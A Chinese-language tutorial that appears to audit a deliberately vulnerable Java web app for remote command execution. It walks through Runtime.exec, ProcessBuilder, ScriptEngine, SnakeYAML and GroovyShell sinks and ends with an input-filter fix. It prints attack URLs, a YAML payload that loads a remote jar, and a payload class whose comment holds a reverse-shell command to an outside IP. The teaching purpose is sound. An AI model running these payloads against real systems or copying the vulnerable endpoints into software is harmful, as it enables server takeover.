## 漏洞原理

RCE漏洞，攻击者可以直接向后台服务器远程注入系统命令或者代码，从而控制后台系统。-
出现此类漏洞通常由于应用系统从设计上须要给用户提供指定的远程命令操做的接口。通常会给用户提供一个ping操做的web界面，用户从web界面输入目标IP，提交后，后台会对该IP地址进行一次ping测试，并返回测试结果。 而若是设计者在完成该功能时，没有作严格的安全控制，则可能会致使攻击者经过该接口提交“意想不到”的命令，从而让后台进行执行，从而控制整个后台服务器

## runtime/exec命令执行

访问url为-
[http://localhost:8080/rce/runtime/exec?cmd=whoami](http://localhost:8080/rce/runtime/exec?cmd=whoami)-
[http://localhost:8080/rce/runtime/exec?cmd=calc](http://localhost:8080/rce/runtime/exec?cmd=calc)

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
    	Runtime run = Runtime.getRuntime();
    	StringBuilder sb = new StringBuilder();
    
    	try {
    		Process p = run.exec(cmd);
    		BufferedInputStream in = new BufferedInputStream(p.getInputStream());
    		BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
    		String tmpStr;
    
    		while ((tmpStr = inBr.readLine()) != null) {
    			sb.append(tmpStr);
    		}
    
    		if (p.waitFor() != 0) {
    			if (p.exitValue() == 1)
    				return "Command exec failed!!";
    		}
    
    		inBr.close();
    		in.close();
    	} catch (Exception e) {
    		return e.toString();
    	}
    	return sb.toString();
    }
    

最基础的**Runtime.getRuntime().exec(cmd)**，直接传入命令即可执行-
![图片.png](https://image.cubox.pro/article/2022103016293215828/29609.jpg)

## ProcessBuilder命令执行

访问url为[http://localhost:8080/rce/ProcessBuilder?cmd=whoami](http://localhost:8080/rce/ProcessBuilder?cmd=whoami)-
同样也是直接执行命令，不同的是使用的是ProcessBuilder来执行命令。**ProcessBuilder**传入参数为列表，第一个参数为可执行命令程序，后面的参数为执行的命令程序的参数。

    /**
     * http://localhost:8080/rce/ProcessBuilder?cmd=whoami
     * @param cmd cmd
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {
    
    	StringBuilder sb = new StringBuilder();
    
    	try {
    	   // String[] arrCmd = {"/bin/sh", "-c", cmd};  //linux
    		String[] arrCmd = {cmd};                 //windows,windos下无需指定
    		ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
    		Process p = processBuilder.start();
    		BufferedInputStream in = new BufferedInputStream(p.getInputStream());
    		BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
    		String tmpStr;
    
    		while ((tmpStr = inBr.readLine()) != null) {
    			sb.append(tmpStr);
    		}
    	} catch (Exception e) {
    		return e.toString();
    	}
    
    	return sb.toString();
    }
    

![图片.png](https://image.cubox.pro/article/2022103016293266058/17478.jpg)

## ScriptEngine命令执行(jscmd)

访问url为[http://localhost:8080/rce/jscmd?jsurl=http://localhost/exe.js](http://localhost:8080/rce/jscmd?jsurl=http://localhost/exe.js)，传入的参数为一个JavaScript代码的url地址[http://localhost/exe.js](http://localhost/exe.js)

    var a = mainOutput();
    function mainOutput() {
    var x=java.lang.Runtime.getRuntime().exec("calc");
    }
    

源码如下，使用的是**ScriptEngine**来对JavaScript代码的调用，最后eval()执行代码

    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
    	// js nashorn javascript ecmascript
    	ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
    	Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);//启动javascript引擎
    	String cmd = String.format("load(\"%s\")", jsurl);
    	engine.eval(cmd, bindings);
    }
    

![图片.png](https://image.cubox.pro/article/2022103016293294137/18059.jpg)-
![图片.png](https://image.cubox.pro/article/2022103016293297055/69378.jpg)

## yml命令执行

YAML(YAML Ain't Markup Language)，也可以叫做YML，是一种人性化的数据序列化的语言，类似于XML，JSON。SpringBoot的配置文件就支持yaml文件

### 使用snakeyaml将yaml文件解析成javabean

添加maven依赖

    复制<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>1.27</version>
    </dependency>
    

访问url为[http://localhost:8080/rce/vuln/yarm](http://localhost:8080/rce/vuln/yarm)-
利用的是SnakeYAML存在的反序列化漏洞来rce，在解析恶意 yml内容时会完成指定的动作。

先是触发java.net.URL去拉取远程 HTTP 服务器上的恶意 jar 文件,然后是寻找 jar 文件中实现javax.script.ScriptEngineFactory接口的类并实例化，实例化类时执行恶意代码，造成 RCE 漏洞。

    public void yarm(String content) {
    	Yaml y = new Yaml();
    	y.load(content);
    }
    

payload在[https://github.com/artsploit/yaml-payload/blob/mast](https://github.com/artsploit/yaml-payload/blob/mast)er/src/artsploit/AwesomeScriptEngineFactory.java有。-
payload AwesomeScriptEngineFactory.java源码如下：

    package artsploit; 
     import javax.script.ScriptEngine; 
    import javax.script.ScriptEngineFactory; 
    import java.io.IOException; 
    import java.util.List; 
     public class AwesomeScriptEngineFactory implements ScriptEngineFactory { 
     public AwesomeScriptEngineFactory() { 
    try { 
          Runtime.getRuntime().exec("notepad.exe"); 
          //Runtime.getRuntime().exec("Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/111.229.85.3/12323 0>&1"});"); 
        } catch (IOException e) { 
              e.printStackTrace(); 
       } 
    } 
     @Override 
    public String getEngineName() { 
    return null; 
    } 
     @Override 
    public String getEngineVersion() { 
    return null; 
    } 
     @Override 
    public List<String> getExtensions() { 
    return null; 
    } 
     @Override 
    public List<String> getMimeTypes() { 
    return null; 
    } 
     @Override 
    public List<String> getNames() { 
    return null; 
    } 
     @Override 
    public String getLanguageName() { 
    return null; 
    } 
     @Override 
    public String getLanguageVersion() { 
    return null; 
    } 
     @Override 
    public Object getParameter(String key) { 
    return null; 
    } 
     @Override 
    public String getMethodCallSyntax(String obj, String m, String... args) { 
    return null; 
    } 
     @Override 
    public String getOutputStatement(String toDisplay) { 
    return null; 
    } 
     @Override 
    public String getProgram(String... statements) { 
    return null; 
    } 
     @Override 
    public ScriptEngine getScriptEngine() { 
    return null; 
    } 
    }
    

把[https://github.com/artsploit/yaml-payload](https://github.com/artsploit/yaml-payload)下载下来，取其中src部-
对上面java代码进行打包，在javac.exe下进行编译

    javac src/artsploit/AwesomeScriptEngineFactory.java
    jar -cvf yaml-payload.jar -C src/ .
    

![图片.png](https://image.cubox.pro/article/2022103016293279732/32038.jpg)-
![图片.png](https://image.cubox.pro/article/2022103016293261417/42489.jpg)-
随后将以下内容传递给参数即可。

    !!javax.script.ScriptEngineManager [
      !!java.net.URLClassLoader [[
        !!java.net.URL ["http://localhost/yaml-payload.jar"]
      ]]
    ]
    

拼接后url

    http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager [
      !!java.net.URLClassLoader [[
        !!java.net.URL ["http://localhost/yaml-payload.jar"]
      ]]
    ]
    

![图片.png](https://image.cubox.pro/article/2022103016293217686/45125.jpg)

## groovy

Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy 代码能够与Java 代码很好地结合，也能用于扩展现有代码

    Groovy语法：
    https://www.w3cschool.cn/groovy/
    

访问url为[http://localhost:8080/rce/groovy?](http://localhost:8080/rce/groovy?)content='calc'.execute()-
GroovyShell可动态运行groovy语言，也可以用于命令执行，如果用户的输入不加以过滤会导致rce。

    public void groovyshell(String content) {
    	GroovyShell groovyShell = new GroovyShell();
    	groovyShell.evaluate(content);
    }
    

![图片.png](https://image.cubox.pro/article/2022103016293234414/96495.jpg)

## 总结

    全局搜索有以下关键字，需注重
    Runtime     StringBuilder     ScriptEngineManager     Yaml    GroovyShell
    

## 修复

### codeinject/sec

这里给出了codeinject的修复版本，利用SecurityUtil.cmdFilter来对传入的参数进行过滤，严格限制用户输入只能包含a-zA-Z0-9\_-.字符。

    private static final Pattern FILTER_PATTERN=Pattern.compile("^[a-zA-Z0-9_/\\.-]+$");
    	public static String cmdFilter(String input) {
    		if (!FILTER_PATTERN.matcher(input).matches()) {
    		return null;
    	}
    	return input;